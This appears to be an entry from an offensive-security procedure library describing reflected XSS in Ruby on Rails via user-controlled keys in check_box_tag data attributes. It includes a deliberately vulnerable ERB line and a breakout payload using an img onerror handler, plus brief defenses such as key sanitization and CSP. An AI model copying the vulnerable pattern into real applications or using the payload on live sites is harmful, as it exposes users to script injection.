---
id: proc-craft-data-payload
tags:
  - xss
  - payload
  - rails
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Ruby on Rails
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:38.982Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft XSS Payload for Data Attributes in Check Box Tag

## Summary

This procedure crafts and injects a malicious payload into data-* attributes of a check_box_tag helper using user-controlled keys in the options hash to breakout and execute JavaScript.

## Description

Exploiting the lack of sanitization in Rails FormTagHelper, user input from URL parameters is used as a key in the data hash, allowing closure of the attribute quote and injection of HTML elements like an img tag with an onerror handler. This results in reflected or stored XSS depending on input persistence.

## Requirements

1. Vulnerable Rails app with ERB view using check_box_tag and params input
2. Access to supply GET parameters (e.g., via browser or curl)
3. JavaScript execution context in the target page

## Defense

Defensive measures and detection strategies:

- Sanitize all hash keys before passing to helpers
- Use Rails' safe attributes list or third-party sanitizers
- Enable Content Security Policy (CSP) to block inline scripts

## Objectives

1. Break out of the data-* attribute boundary
2. Inject executable HTML/JS
3. Achieve arbitrary code execution

## Instructions

### Step 1: Prepare Vulnerable ERB View

**Context**: Set up the helper call with user input.

In the view file:

```erb
<%= check_box_tag('thename', 'thevalue', false, data: { params[:payload] => 'thevalueofdata' }) %>
```

> This allows the payload key to control the attribute name.

### Step 2: Inject Payload via URL

**Context**: Supply the breakout payload.

Access the endpoint with: `?payload=something="something"><img src="/nonexistent" onerror="alert(1)"><div class`

> The generated HTML becomes `<input ... data-something="something"><img src="/nonexistent" onerror="alert(1)"><div class='thevalueofdata'>`, executing the alert.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[payload]]
- [[rails]]
